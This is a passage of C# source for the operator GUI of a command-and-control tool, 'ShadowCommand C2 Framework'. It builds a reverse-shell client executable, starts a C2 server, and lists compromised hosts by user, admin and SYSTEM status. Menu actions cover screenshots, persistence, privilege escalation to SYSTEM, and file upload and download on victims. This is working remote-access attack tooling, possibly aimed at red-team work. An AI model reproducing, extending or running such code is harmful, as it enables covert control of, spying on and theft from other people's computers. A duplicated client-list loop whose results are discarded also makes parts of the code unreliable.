                                            LogMessage($"[+] Compression enabled: {output.ToString().Contains("Compressing")}", Color.Green);
                                        }));
                                    }

                                    this.Invoke(new Action(() =>
                                    {
                                        if (process.ExitCode == 0)
                                        {
                                            // Verify the output file exists
                                            string defaultOutput = Path.Combine(outputDir, "ReverseShellClient.exe");
                                            if (File.Exists(defaultOutput))
                                            {
                                                File.Move(defaultOutput, outputPath);
                                                LogMessage($"[+] Client built successfully: {outputPath}", Color.Green);
                                                LogMessage($"[+] Size: {new FileInfo(outputPath).Length:N0} bytes", Color.Green);
                                                Process.Start("explorer.exe", $"/select, \"{outputPath}\"");
                                            }
                                            else
                                            {
                                                LogMessage("[!] Build succeeded but output file not found", Color.Red);
                                            }
                                        }
                                        else
                                        {
                                            LogMessage("[!] Build failed with errors:", Color.Red);
                                            LogMessage(errors.ToString(), Color.Red);
                                            LogMessage(output.ToString(), Color.Red);
                                        }
                                    }));
                                }
                            }
                            finally
                            {
                                // Clean up temporary directory
                                if (Directory.Exists(tempDir))
                                {
                                    try
                                    {
                                        Directory.Delete(tempDir, true);
                                    }
                                    catch (Exception ex)
                                    {
                                        this.Invoke(new Action(() =>
                                        {
                                            LogMessage($"[!] Failed to clean up temporary directory: {ex.Message}", Color.Yellow);
                                        }));
                                    }
                                }
                                // Clean up output directory if empty
                                if (Directory.Exists(outputDir) && !Directory.EnumerateFileSystemEntries(outputDir).Any())
                                {
                                    try
                                    {
                                        Directory.Delete(outputDir);
                                    }
                                    catch { }
                                }
                            }
                        }
                        catch (Exception ex)
                        {
                            this.Invoke(new Action(() =>
                            {
                                LogMessage($"[!] Build error: {ex.Message}", Color.Red);
                            }));
                        }
                    });
                }
            };

            panel2.Controls.Add(btnBuildClient);
        }
        private async Task StartClientHeartbeat()
        {
            // Send heartbeat every 2 minutes to keep connection alive
            _clientHeartbeatTimer = new System.Threading.Timer(async _ =>
            {
                if (_isOperatorConnected && _operatorConnection?.Connected == true)
                {
                    try
                    {
                        var heartbeat = new OperatorMessage
                        {
                            Type = OperatorMessageType.HeartBeat,
                            From = _operatorUsername,
                            Data = "PING"
                        };

                        string heartbeatJson = JsonSerializer.Serialize(heartbeat);
                        byte[] data = Encoding.UTF8.GetBytes(heartbeatJson);
                        await _operatorStream.WriteAsync(data, 0, data.Length);
                        await _operatorStream.FlushAsync();

                    }
                    catch (Exception ex)
                    {
                        LogMessage($"[!] Heartbeat failed: {ex.Message}", Color.Red);
                        // Connection might be dead, trigger disconnect
                        this.Invoke(new Action(() => DisconnectFromOperatorServer()));
                    }
                }
            }, null, TimeSpan.FromMinutes(2), TimeSpan.FromMinutes(2)); // Every 2 minutes
        }


        private void ApplyDarkTheme()
        {
            // Set dark theme colors
            Color darkBackground = Color.FromArgb(30, 30, 30);
            Color darkForeground = Color.FromArgb(220, 220, 220);
            Color accentColor = Color.FromArgb(0, 120, 215);

            // Apply to form
            this.BackColor = darkBackground;
            this.ForeColor = darkForeground;

            // Apply to panels
            panel1.BackColor = Color.FromArgb(45, 45, 48);
            panel2.BackColor = Color.FromArgb(45, 45, 48);

            // Apply to text boxes
            txtCommand.BackColor = Color.FromArgb(30, 30, 30);
            txtCommand.ForeColor = Color.FromArgb(220, 220, 220);
            txtCommand.BorderStyle = BorderStyle.FixedSingle;

            txtIPAddress.BackColor = Color.FromArgb(30, 30, 30);
            txtIPAddress.ForeColor = Color.FromArgb(220, 220, 220);
            txtIPAddress.BorderStyle = BorderStyle.FixedSingle;

            txtPort.BackColor = Color.FromArgb(30, 30, 30);
            txtPort.ForeColor = Color.FromArgb(220, 220, 220);
            txtPort.BorderStyle = BorderStyle.FixedSingle;

            // Apply to buttons
            StyleButton(btnStartServer, accentColor);
            StyleButton(btnSendCommand, accentColor);

            // Apply to list view
            lvClients.BackColor = Color.FromArgb(30, 30, 30);
            lvClients.ForeColor = Color.FromArgb(220, 220, 220);

            // Apply to status strip
            statusStrip.BackColor = Color.FromArgb(45, 45, 48);
            statusStripLabel.ForeColor = Color.FromArgb(220, 220, 220);

            // Apply to context menu
            contextMenuClient.BackColor = Color.FromArgb(45, 45, 48);
            contextMenuClient.ForeColor = Color.FromArgb(220, 220, 220);
            foreach (ToolStripItem item in contextMenuClient.Items)
            {
                item.BackColor = Color.FromArgb(45, 45, 48);
                item.ForeColor = Color.FromArgb(220, 220, 220);
            }

            // Style rich text output
            txtOutput.BackColor = Color.FromArgb(20, 20, 20);
            txtOutput.ForeColor = Color.FromArgb(220, 220, 220);
        }

        private void StyleButton(Button button, Color accentColor)
        {
            button.FlatStyle = FlatStyle.Flat;
            button.FlatAppearance.BorderColor = accentColor;
            button.BackColor = Color.FromArgb(45, 45, 48);
            button.ForeColor = Color.FromArgb(220, 220, 220);
            button.FlatAppearance.MouseOverBackColor = accentColor;
            button.FlatAppearance.MouseDownBackColor = Color.FromArgb(0, 80, 160);
            button.UseVisualStyleBackColor = false;
        }
        private void MainForm_Resize(object sender, EventArgs e)
        {
            if (txtOutput != null && panel1 != null && panel2 != null)
            {
                txtOutput.Size = new Size(
                    splitContainer1.Panel2.ClientSize.Width,
                    splitContainer1.Panel2.ClientSize.Height - panel1.Height - panel2.Height);
            }
        }
        private void FixLayoutIssue()
        {
            // Set panel properties
            panel2.Dock = DockStyle.Top;
            panel2.Height = 40;

            panel1.Dock = DockStyle.Bottom;
            panel1.Height = 36;

            // Configure the output control with absolute positioning
            txtOutput.Dock = DockStyle.None;
            txtOutput.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
            txtOutput.Location = new Point(0, panel2.Height);
            txtOutput.Size = new Size(
                splitContainer1.Panel2.ClientSize.Width,
                splitContainer1.Panel2.ClientSize.Height - panel1.Height - panel2.Height);
        }
        private void SetupCommandHistory()
        {
            txtCommand.KeyDown += (sender, e) =>
            {
                if (e.KeyCode == Keys.Up)
                {
                    NavigateCommandHistory(-1);
                    e.Handled = true;
                }
                else if (e.KeyCode == Keys.Down)
                {
                    NavigateCommandHistory(1);
                    e.Handled = true;
                }
            };
        }

        private void NavigateCommandHistory(int direction)
        {
            if (_commandHistory.Count == 0)
                return;

            _commandHistoryIndex += direction;

            // Bounds checking
            if (_commandHistoryIndex < 0)
                _commandHistoryIndex = 0;
            else if (_commandHistoryIndex >= _commandHistory.Count)
            {
                _commandHistoryIndex = _commandHistory.Count;
                txtCommand.Text = "";
                return;
            }

            txtCommand.Text = _commandHistory[_commandHistoryIndex];
            txtCommand.SelectionStart = txtCommand.Text.Length;
        }
        private void InitializeGradientColors()
        {
            // Create a smooth gradient from blue to cyan to purple
            _gradientColors = new Color[]
            {
                Color.DarkBlue,
                Color.Blue,
                Color.DarkCyan,
                Color.Cyan,
                Color.DarkMagenta,
                Color.Magenta
            };
        }

        private void InitializeStatusTimer()
        {
            _statusTimer = new System.Windows.Forms.Timer();
            _statusTimer.Interval = 1000; // Update every second
            _statusTimer.Tick += StatusTimer_Tick;
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            this.Text = "ShadowCommand C2 Framework";
            UpdateStatusBar("Server not started");
            txtCommand.Enabled = false;
            btnSendCommand.Enabled = false;
            string ipAddress;
            try
            {
                using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    ipAddress = endPoint.Address.ToString();
                }
            }
            catch
            {
                ipAddress = "127.0.0.1"; // Fallback
            }
            txtIPAddress.Text = ipAddress;
            txtPort.Text = _port.ToString();
            DisplayBanner();
            // Check and prepare certificate if needed
            CheckAndPrepareCertificate();
            LogMessage("[*] Ready - Start server or connect as operator to begin", Color.Cyan);
            this.WindowState = FormWindowState.Maximized;
            UpdateContextMenuWithFileExplorer();
            // Load profiles only once during form load
            if (!_profilesLoaded)
            {
                LoadOperatorProfiles();
            }
        }
        private void CheckAndPrepareCertificate()
        {
            try
            {
                // Check if certificate file exists
                if (!File.Exists("server_cert.pfx"))
                {
                    LogMessage("[*] No TLS certificate found, generating new certificate...", Color.Yellow);

                    _serverCertificate = CertificateManager.GetOrCreateCertificate();

                    if (_serverCertificate != null)
                    {
                        LogMessage($"[+] TLS certificate generated successfully", Color.Green);
                        LogMessage($"[*] Certificate fingerprint: {_serverCertificate.Thumbprint}", Color.Cyan);
                    }
                    else
                    {
                        LogMessage("[!] Failed to generate TLS certificate", Color.Red);
                    }
                }
                else
                {
                    LogMessage("[*] Existing TLS certificate found", Color.Cyan);

                    // Load existing certificate
                    _serverCertificate = CertificateManager.GetOrCreateCertificate();

                    if (_serverCertificate != null)
                    {
                        LogMessage($"[+] TLS certificate loaded successfully", Color.Green);
                        LogMessage($"[*] Certificate valid until: {_serverCertificate.NotAfter:yyyy-MM-dd}", Color.Cyan);
                    }
                }
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Certificate preparation error: {ex.Message}", Color.Red);
                LogMessage("[*] Server will run without TLS if certificate fails", Color.Yellow);
                _serverCertificate = null;
            }
        }
        private void DisplayBanner()
        {
            string banner = @"
   _______ __             __              ______                                      __
  / ___/ // /__ ____  ___/ /__  _      __/ ____/___  ____ ___  ____ ___  ____ _____/ /
  \__ \/ // / _ `/ _ \/ _  / _ \| | /| / / /   / __ \/ __ `__ \/ __ `__ \/ __ `/ __  / 
 ___/ / // / /_// // / // / // /| |/ |/ / /___/ /_/ / / / / / / / / / / / /_/ / /_/ /  
/____/_//_/\__,_/___/\__,_/\___/ |__/|__/\____/\____/_/ /_/ /_/_/ /_/ /_/\__,_/\__,_/   
                      Open Source Command and Control Framework | v1.6.0                                  
";
            LogMessage(banner, Color.Cyan);

        }

        private void btnStartServer_Click(object sender, EventArgs e)
        {
            if (!_isServerRunning)
            {
                try
                {
                    string ipAddress;
                    try
                    {
                        using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
                        {
                            socket.Connect("8.8.8.8", 65530);
                            IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                            ipAddress = endPoint.Address.ToString();
                        }
                    }
                    catch
                    {
                        ipAddress = "127.0.0.1"; // Fallback
                    }
                    txtIPAddress.Text = ipAddress;
                    string _ipAddress = txtIPAddress.Text;
                    if (!int.TryParse(txtPort.Text, out _port))
                    {
                        _port = 443;
                    }

                    _server = new C2Server(_ipAddress, _port);
                    _server.OutputMessage += Server_OutputMessage;
                    _server.ClientListChanged += Server_ClientListChanged;

                    _server.OperatorListChanged += Server_OperatorListChanged;

                    _server.Start();


                    if (_multiplayerEnabled)
                    {
                        LogMessage("[*] Multiplayer enabled - starting operator server...", Color.Cyan);
                        _server.InitializeOperatorServer();
                    }
                    else
                    {
                        LogMessage("[*] Multiplayer disabled - operator server not started", Color.Gray);
                    }

                    _isServerRunning = true;
                    btnStartServer.Text = "Stop Server";
                    txtIPAddress.Enabled = false;
                    txtPort.Enabled = false;

                    txtCommand.Enabled = true;
                    btnSendCommand.Enabled = true;

                    _statusTimer.Start();
                    UpdateMultiplayerUI();

                    if (_multiplayerEnabled)
                    {
                        System.Windows.Forms.Timer operatorRefreshTimer = new System.Windows.Forms.Timer();
                        operatorRefreshTimer.Interval = 10000; // Every 10 seconds for periodic updates
                        operatorRefreshTimer.Tick += (s, args) =>
                        {
                            RefreshOperatorList();
                        };
                        operatorRefreshTimer.Start();
                    }
                }
                catch (Exception ex)
                {
                    LogMessage($"[!] Error starting server: {ex.Message}", Color.Red);
                }
            }
            else
            {
                StopServer();
            }
        }


        private void Server_OperatorListChanged(object sender, EventArgs e)
        {
            // Invoke to UI thread if needed
            if (InvokeRequired)
            {
                Invoke(new Action(() => RefreshOperatorList()));
            }
            else
            {
                RefreshOperatorList();
            }
        }




        private void StopServer()
        {
            if (_isServerRunning)
            {

                if (_isOperatorConnected)
                {
                    DisconnectFromOperatorServer();
                }

                if (_server != null)
                {
                    _server.OutputMessage -= Server_OutputMessage;
                    _server.ClientListChanged -= Server_ClientListChanged;
                    _server.OperatorListChanged -= Server_OperatorListChanged;

                    _server.StopOperatorServer();

                    System.Threading.Thread.Sleep(500);

                    _server.Stop();
                }

                _isServerRunning = false;
                btnStartServer.Text = "Start Server";
                txtIPAddress.Enabled = true;
                txtPort.Enabled = true;

                // Disable command controls when server stops
                txtCommand.Enabled = false;
                btnSendCommand.Enabled = false;

                _statusTimer.Stop();

                // Update multiplayer UI AFTER setting _isServerRunning to false
                UpdateMultiplayerUI();

                LogMessage("[*] Server stopped completely", Color.Yellow);
                UpdateStatusBar("Server stopped");
            }
        }

        private void UpdateOperatorModeVisuals()
        {
            if (_isOperatorConnected)
            {
                this.Text = $"ShadowCommand C2 Framework - Operator Mode ({_operatorUsername})";

                panel2.BackColor = Color.FromArgb(50, 50, 80); // Slightly blue tint
            }
            else
            {
                this.Text = "ShadowCommand C2 Framework";
                panel2.BackColor = Color.FromArgb(45, 45, 48); // Original dark color
            }
        }
        private void Server_OutputMessage(object sender, OutputMessageEventArgs e)
        {
            // Invoke to UI thread if needed
            if (InvokeRequired)
            {
                Invoke(new Action(() =>
                {
                    LogMessage(e.Message, e.Color);

                    // Add to activity monitor if it's important
                    if (e.Message.Contains("[+]") || e.Message.Contains("[!]"))
                    {
                        AddActivityItem(e.Message, e.Color);
                    }
                }));
            }
            else
            {
                LogMessage(e.Message, e.Color);

                if (e.Message.Contains("[+]") || e.Message.Contains("[!]"))
                {
                    AddActivityItem(e.Message, e.Color);
                }
            }
        }

        private void Server_ClientListChanged(object sender, EventArgs e)
        {
            RefreshClientList(); // This will now also update topology

            if (_server != null && _server.IsMultiplayerEnabled())
            {
                BroadcastClientListToOperators();
            }
        }


        private void ShowBeaconInfoDialog(string beaconId)
        {
            var client = GetClientById(beaconId);
            if (client == null) return;

            var infoText = $@"
🎯 Beacon Information: {beaconId}
{'=' * 50}

💻 System Details:
  • Computer Name: {client.ComputerName ?? "Unknown"}
  • Operating System: {client.OSVersion ?? "Unknown"}
  • Architecture: {(client.IsLinux ? "Linux" : "Windows")}

👤 User Context:
  • Username: {client.UserName ?? "Unknown"}
  • Privilege Level: {(client.UserName?.Contains("SYSTEM") == true ? "SYSTEM" : client.IsAdmin ? "Administrator" : "Standard User")}
  • Account Type: {(client.IsDomainJoined ? "Domain Account" : "Local Account")}

🔒 Security Status:
  • Connection: {(client.IsEncrypted ? "🔒 Encrypted (TLS)" : "🔓 Unencrypted")}
  • Status: {(client.IsConnected ? "🟢 Active" : "🔴 Disconnected")}
  • Last Seen: {client.LastSeen:yyyy-MM-dd HH:mm:ss}

🌐 Network Information:
  • Endpoint: {client.ClientInfo ?? "Unknown"}
  • Session ID: {client.ClientId}
";

            MessageBox.Show(infoText, $"Beacon Details - {beaconId}",
                           MessageBoxButtons.OK, MessageBoxIcon.Information);
        }
        private void CenterViewOnBeacon(string beaconId)
        {

            LogMessage($"[*] Centered view on beacon: {beaconId}", Color.Cyan);
        }

        private dynamic GetClientById(string clientId)
        {
            if (_isOperatorConnected)
            {
                // For operator mode, search in ListView
                foreach (ListViewItem item in lvClients.Items)
                {
                    if (item.Tag?.ToString() == clientId)
                    {
                        return new
                        {
                            ClientId = clientId,
                            ComputerName = item.SubItems[4].Text,
                            OSVersion = item.SubItems[7].Text,
                            UserName = ExtractUsernameFromDisplay(item.SubItems[3].Text),
                            IsAdmin = item.SubItems[5].Text == "Yes",
                            IsConnected = item.SubItems[2].Text == "Active",
                            IsEncrypted = item.SubItems[6].Text.Contains("🔒"),
                            ClientInfo = item.SubItems[1].Text,
                            IsDomainJoined = item.SubItems[3].Text.Contains("(Domain User)"),
                            IsLinux = item.SubItems[7].Text.ToLower().Contains("linux"),
                            LastSeen = DateTime.Now
                        };
                    }
                }
            }
            else
            {
                // For local server mode
                return _server?.GetClients().FirstOrDefault(c => c.ClientId == clientId);
            }

            return null;
        }


        private void OnTopologyRightClick(object sender, MouseEventArgs e)
        {
            if (e.Button == MouseButtons.Right && _isTopologyView)
            {
                var clickedNode = _topologyViewer.GetNodeAtPosition(e.Location);

                if (clickedNode != null && clickedNode.NodeType != NodeType.Server)
                {
                    // Right-clicked on a beacon - show beacon context menu
                    foreach (ListViewItem item in lvClients.Items)
                    {
                        if (item.Tag?.ToString() == clickedNode.Id)
                        {
                            item.Selected = true;
                            item.EnsureVisible();
                            break;
                        }
                    }

                    ShowTopologyContextMenu(e.Location, clickedNode.Id);
                }
                else if (clickedNode == null)
                {
                    // Right-clicked on empty space - show topology management menu
                    ShowTopologyManagementMenu(e.Location);
                }
            }
        }
        private void ShowTopologyManagementMenu(Point location)
        {
            var contextMenu = new ContextMenuStrip();
            contextMenu.BackColor = Color.FromArgb(45, 45, 48);
            contextMenu.ForeColor = Color.FromArgb(220, 220, 220);

            // Reset Positions item
            var resetItem = new ToolStripMenuItem("🔄 Reset Beacon Positions");
            resetItem.Click += (s, e) =>
            {
                _topologyViewer.ResetBeaconPositions();
                LogMessage("[*] Beacon positions reset to default layout", Color.Cyan);
            };

            // Center View item
            var centerViewItem = new ToolStripMenuItem("🎯 Center View");
            centerViewItem.Click += (s, e) =>
            {
                // Reset the topology viewer's view center
                _topologyViewer.CenterView();
                LogMessage("[*] View centered on server", Color.Cyan);
            };

            contextMenu.Items.AddRange(new ToolStripItem[]
            {
        resetItem,
        centerViewItem
            });

            // Apply dark theme styling
            foreach (ToolStripItem item in contextMenu.Items)
            {
                if (item is ToolStripMenuItem menuItem)
                {
                    menuItem.BackColor = Color.FromArgb(45, 45, 48);
                    menuItem.ForeColor = Color.FromArgb(220, 220, 220);
                }
            }

            contextMenu.Show(this, location);
        }

        private bool IsCommandAllowedForCurrentRole(string commandType)
        {
            if (!_isOperatorConnected) return true; // Local server mode - all allowed

            if (_currentOperatorRole == "Observer")
            {
                return false;
            }

            // Regular operators have restrictions on certain commands
            var restrictedForOperators = new[] { "kill", "persist", "getsystem", "upload" };
            return !restrictedForOperators.Contains(commandType.ToLower());
        }


        private void ShowTopologyContextMenu(Point location, string beaconId)
        {
            var contextMenu = new ContextMenuStrip();
            contextMenu.BackColor = Color.FromArgb(45, 45, 48);
            contextMenu.ForeColor = Color.FromArgb(220, 220, 220);

            // Get client info for menu customization
            var client = GetClientById(beaconId);
            bool isOperatorMode = _isOperatorConnected;
            bool isObserver = _currentOperatorRole == "Observer";

            var connectItem = new ToolStripMenuItem("🔗 Connect to Beacon");
            connectItem.Click += (s, e) =>
            {
                if (isObserver)
                {
                    LogMessage("[!] Observer role cannot connect to client sessions", Color.Orange);
                    return;
                }
                ProcessCommand($"connect {beaconId}");
            };
            connectItem.Enabled = !isObserver;

            var screenshotItem = new ToolStripMenuItem("📷 Take Screenshot");
            screenshotItem.Click += (s, e) =>
            {
                if (isObserver)
                {
                    LogMessage("[!] Observer role cannot execute commands", Color.Orange);
                    return;
                }
                ProcessCommand("screenshot");
            };
            screenshotItem.Enabled = !isObserver;

            var infoItem = new ToolStripMenuItem("ℹ️ Beacon Information");
            infoItem.Click += (s, e) => ShowBeaconInfoDialog(beaconId);

            var centerItem = new ToolStripMenuItem("🎯 Center View");
            centerItem.Click += (s, e) => CenterViewOnBeacon(beaconId);


            // Disconnect item
            var disconnectItem = new ToolStripMenuItem("🔌 Disconnect");
            disconnectItem.Click += (s, e) => ProcessCommand("disconnect");

            // Kill item  
            var killItem = new ToolStripMenuItem("💀 Kill");
            killItem.Click += (s, e) =>
            {
                if (isOperatorMode)
                {
                    LogMessage("[!] Kill function is disabled for operators", Color.Red);
                    return;
                }

                DialogResult result = MessageBox.Show(
                    $"Are you sure you want to terminate client {beaconId}?",
                    "Confirm Kill",
                    MessageBoxButtons.YesNo,
                    MessageBoxIcon.Warning);

                if (result == DialogResult.Yes)
                {
                    ProcessCommand($"kill {beaconId}");
                }
            };
            killItem.Enabled = !isOperatorMode;

            // Persist item
            var persistItem = new ToolStripMenuItem("🔄 Persist");
            persistItem.Click += (s, e) =>
            {
                if (isOperatorMode)
                {
                    LogMessage("[!] Persistence function is disabled for operators", Color.Red);
                    return;
                }
                ProcessCommand("persist");
            };
            persistItem.Enabled = !isOperatorMode;

            // GetSystem item
            var getsystemItem = new ToolStripMenuItem("⚡ Get SYSTEM");
            getsystemItem.Click += (s, e) =>
            {
                if (isOperatorMode)
                {
                    LogMessage("[!] GetSystem function is disabled for operators", Color.Red);
                    return;
                }

                if (client?.IsLinux == true)
                {
                    LogMessage("[!] GetSystem not supported on Linux targets", Color.Red);
                    return;
                }

                ProcessCommand("getsystem");
            };
            getsystemItem.Enabled = !isOperatorMode && (client?.IsLinux != true);

            // File Explorer item
            var fileExplorerItem = new ToolStripMenuItem();
            if (isOperatorMode)
            {
                if (isObserver)
                {
                    fileExplorerItem.Text = "🗂️ File Browser (Observer - Disabled)";
                    fileExplorerItem.Enabled = false;
                    fileExplorerItem.ForeColor = Color.Gray;
                }
                else
                {
                    fileExplorerItem.Text = "🗂️ File Browser (Text Mode)";
                    fileExplorerItem.Enabled = true;
                }
            }
            else
            {
                fileExplorerItem.Text = "🗂️ File Explorer (GUI)";
                fileExplorerItem.Enabled = true;
            }

            fileExplorerItem.Click += (s, e) =>
            {
                fileExplorerToolStripMenuItem_Click(s, e);
            };

            // Download item
            var downloadItem = new ToolStripMenuItem("📥 Download");
            downloadItem.Click += (s, e) =>
            {
                if (isObserver)
                {
                    LogMessage("[!] Observer role cannot execute commands", Color.Orange);
                    return;
                }
                downloadToolStripMenuItem_Click(s, e);
            };
            downloadItem.Enabled = !isObserver;

            // Upload item
            var uploadItem = new ToolStripMenuItem("📤 Upload");
            uploadItem.Click += (s, e) =>
            {
                if (isOperatorMode)
                {
                    LogMessage("[!] Upload function is disabled for operators", Color.Red);
                    return;
                }
                uploadToolStripMenuItem_Click(s, e);
            };
            uploadItem.Enabled = !isOperatorMode;

            contextMenu.Items.AddRange(new ToolStripItem[]
            {
        connectItem,          // Connect
        disconnectItem,       // Disconnect  
        killItem,            // Kill
        new ToolStripSeparator(),
        screenshotItem,      // Screenshot
        persistItem,         // Persist (ADDED)
        getsystemItem,       // Get SYSTEM (ADDED)
        new ToolStripSeparator(),
        fileExplorerItem,    // File Explorer (ADDED)
        downloadItem,        // Download (ADDED)
        uploadItem,          // Upload (ADDED)
        new ToolStripSeparator(),
        infoItem,           // Beacon Information
        centerItem          // Center View (topology-specific)
            });

            // Apply dark theme styling
            foreach (ToolStripItem item in contextMenu.Items)
            {
                if (item is ToolStripMenuItem menuItem)
                {
                    menuItem.BackColor = Color.FromArgb(45, 45, 48);
                    menuItem.ForeColor = Color.FromArgb(220, 220, 220);

                    if (!menuItem.Enabled)
                    {
                        menuItem.ForeColor = Color.Gray;
                    }
                }
                else if (item is ToolStripSeparator separator)
                {
                    separator.BackColor = Color.FromArgb(45, 45, 48);
                    separator.ForeColor = Color.FromArgb(100, 100, 100);
                }
            }

            contextMenu.Show(this, location);
        }
        private void BroadcastClientListToOperators()
        {
            if (_server == null || !_server.IsMultiplayerEnabled()) return;

            try
            {
                var clients = _server.GetClients().Where(c => c.IsConnected).Select(c => new
                {
                    c.ClientId,
                    c.ClientInfo,
                    c.UserName,
                    c.ComputerName,
                    c.IsAdmin,
                    c.OSVersion,
                    c.IsConnected,
                    c.IsEncrypted,
                    c.LastSeen,
                    c.IsLinux,
                    c.ShellType
                }).ToList();

                // Broadcast to all connected operators
                _server.BroadcastToOperators(new OperatorMessage
                {
                    Type = OperatorMessageType.ClientList,
                    From = "SERVER",
                    Data = JsonSerializer.Serialize(clients)
                });
            }
            catch (Exception ex)
            {
                LogMessage($"[!] Error broadcasting client list to operators: {ex.Message}", Color.Red);
            }
        }



        private void LogMessage(string message, Color color)
        {
            if (InvokeRequired)
            {
                Invoke(new Action(() => LogMessage(message, color)));
                return;
            }

            // Format message with timestamp if it doesn't already have one
            string formattedMessage;
            if (!message.TrimStart().StartsWith("[") || !Regex.IsMatch(message.TrimStart(), @"^\[\d{2}:\d{2}:\d{2}\]"))
            {
                formattedMessage = $"[{DateTime.Now:HH:mm:ss}] {message}{Environment.NewLine}";
            }
            else
            {
                formattedMessage = message + Environment.NewLine;
            }

            // Store current scroll position and selection state
            bool wasAtBottom = IsScrolledToBottom();
            int originalSelectionStart = txtOutput.SelectionStart;
            int originalSelectionLength = txtOutput.SelectionLength;
            bool hadSelection = originalSelectionLength > 0;

            // Temporarily disable redrawing for performance
            SendMessage(txtOutput.Handle, WM_SETREDRAW, false, 0);

            try
            {
                // Move to end and append text
                txtOutput.SelectionStart = txtOutput.TextLength;
                txtOutput.SelectionLength = 0;
                txtOutput.SelectionColor = color;
                txtOutput.AppendText(formattedMessage);


                if (message.Contains("[+]") || message.Contains("[!]") || message.Contains("Connected") ||
                    message.Contains("Disconnected") || message.Contains("Download") || message.Contains("Upload") ||
                    message.Contains("Screenshot") || message.Contains("SYSTEM") || message.Contains("Admin"))
                {
                    AddActivityItem(message, color);
                }

                // Restore selection if user had something selected and we weren't at bottom
                if (hadSelection && !wasAtBottom && originalSelectionStart < txtOutput.TextLength)
                {
                    txtOutput.SelectionStart = originalSelectionStart;
                    txtOutput.SelectionLength = Math.Min(originalSelectionLength, txtOutput.TextLength - originalSelectionStart);
                    txtOutput.SelectionColor = txtOutput.ForeColor;
                }
                else if (wasAtBottom)
                {
                    txtOutput.SelectionStart = txtOutput.TextLength;
                    txtOutput.SelectionLength = 0;
                    txtOutput.ScrollToCaret();
                }
                else
                {
                    txtOutput.SelectionStart = originalSelectionStart;
                    txtOutput.SelectionLength = 0;
                }
            }
            finally
            {
                SendMessage(txtOutput.Handle, WM_SETREDRAW, true, 0);
                txtOutput.Invalidate();
            }
        }

        private bool IsScrolledToBottom()
        {
            // Check if the user is scrolled to the bottom (within a small margin)
            const int margin = 10;

            // Get the position of the last visible character
            int lastVisibleChar = txtOutput.GetCharIndexFromPosition(new Point(0, txtOutput.ClientSize.Height));

            // Compare with total text length
            return (txtOutput.TextLength - lastVisibleChar) <= margin;
        }

        private const int WM_SETREDRAW = 0x0B;

        [System.Runtime.InteropServices.DllImport("user32.dll")]
        private static extern int SendMessage(IntPtr hWnd, int wMsg, bool wParam, int lParam);

        private void RefreshClientList()
        {
            if (_isOperatorConnected && _operatorConnection?.Connected == true)
            {
                // Request fresh client list from server
                Task.Run(() => RequestClientListFromServer());
                return;
            }

            // Original local server refresh logic
            if (_server == null) return;

            if (InvokeRequired)
            {
                Invoke(new Action(RefreshClientList));
                return;
            }

            lvClients.Items.Clear();

            foreach (var client in _server.GetClients())
            {
                ListViewItem item = new ListViewItem(client.ClientId);

                string username = client.UserName;

                if (username.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    username.Contains("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    username.Contains("NT AUTHORITY", StringComparison.OrdinalIgnoreCase) ||
                    username.EndsWith("$", StringComparison.OrdinalIgnoreCase))
                {
                    username = "NT AUTHORITY\\SYSTEM";
                }
                else
                {
                    bool isDomainUser = client.IsDomainJoined; // Use the definitive domain detection

                    if (client.IsAdmin)
                    {
                        if (!username.Contains("(Administrator)"))
                        {
                            username = $"{username} (Administrator)";
                        }
                    }

                    if (!username.Contains("(Local User)") && !username.Contains("(Domain User)"))
                    {
                        if (isDomainUser)
                        {
                            username = $"{username} (Domain User)";
                        }
                        else
                        {
                            username = $"{username} (Local User)";
                        }
                    }
                }

                if (!string.IsNullOrEmpty(client.ClientId))
                {
                    item.Tag = client.ClientId;
                }
                else
                {
                    item.Tag = "UNKNOWN";
                }

                item.SubItems.Add(client.ClientInfo);
                item.SubItems.Add(client.IsConnected ? "Active" : "Disconnected");
                item.SubItems.Add(username);
                item.SubItems.Add(client.ComputerName);
                item.SubItems.Add(client.IsAdmin ? "Yes" : "No");
                item.SubItems.Add(client.IsEncrypted ? "🔒 TLS" : "🔓 Plain");
                item.SubItems.Add(client.OSVersion);

                if (username.Equals("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase))
                {
                    item.ForeColor = Color.FromArgb(255, 0, 0);
                }
                else if (client.IsAdmin)
                {
                    item.ForeColor = Color.FromArgb(220, 0, 0);
                }
                else if (username.Contains("(Domain User)"))
                {
                    item.ForeColor = Color.FromArgb(0, 120, 215);
                }

                if (client.IsEncrypted)
                {
                    item.SubItems[6].ForeColor = Color.FromArgb(0, 255, 0);
                }
                else
                {
                    item.SubItems[6].ForeColor = Color.FromArgb(255, 165, 0);
                }

                if (_server.ActiveClientId == client.ClientId)
                {
                    item.Font = new Font(lvClients.Font, FontStyle.Bold);
                }


                lvClients.Items.Add(item);
            }
            foreach (var client in _server.GetClients())
            {
                ListViewItem item = new ListViewItem(client.ClientId);

                string username = client.UserName;

                bool isDomainUser = client.IsDomainJoined;

                if (username.Equals("SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    username.Contains("NT AUTHORITY\\SYSTEM", StringComparison.OrdinalIgnoreCase) ||
                    username.Contains("NT AUTHORITY", StringComparison.OrdinalIgnoreCase) ||
                    username.EndsWith("$", StringComparison.OrdinalIgnoreCase))
                {
                    username = "NT AUTHORITY\\SYSTEM";
                }
                else
                {
                    if (client.IsAdmin)
                    {
                        if (!username.Contains("(Administrator)"))
                        {
                            username = $"{username} (Administrator)";
                        }
                    }

                    if (!username.Contains("(Local User)") && !username.Contains("(Domain User)"))
                    {
                        if (isDomainUser)
                        {
                            username = $"{username} (Domain User)";
                        }
                        else
                        {
                            username = $"{username} (Local User)";
                        }
                    }
                }

            }
            if (_isTopologyView && _topologyViewer != null)
            {
                UpdateTopologyView();
            }

            UpdateStatusBar();
        }
        private void StatusTimer_Tick(object sender, EventArgs e)
        {
            UpdateStatusBar();
        }
        private void UpdateTopologyView()
        {
            if (_topologyViewer == null) return;

            try
            {
